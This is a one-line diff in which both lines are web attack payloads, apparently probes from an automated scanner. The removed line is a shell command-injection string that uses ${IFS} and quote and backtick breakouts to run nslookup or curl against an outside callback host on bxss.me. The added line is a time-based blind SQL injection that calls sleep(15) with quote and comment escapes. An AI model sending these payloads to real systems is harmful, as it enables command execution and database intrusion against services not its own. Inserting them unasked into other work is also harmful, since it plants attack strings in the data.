@@ -1,1 +1,1 @@
-&(nslookup${IFS}-q${IFS}cname${IFS}hitubeqvthrdu21942.bxss.me||curl${IFS}hitubeqvthrdu21942.bxss.me)&'\"`0&(nslookup${IFS}-q${IFS}cname${IFS}hitubeqvthrdu21942.bxss.me||curl${IFS}hitubeqvthrdu21942.bxss.me)&`'
+(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'"+(select(0)from(select(sleep(15)))v)+"*/
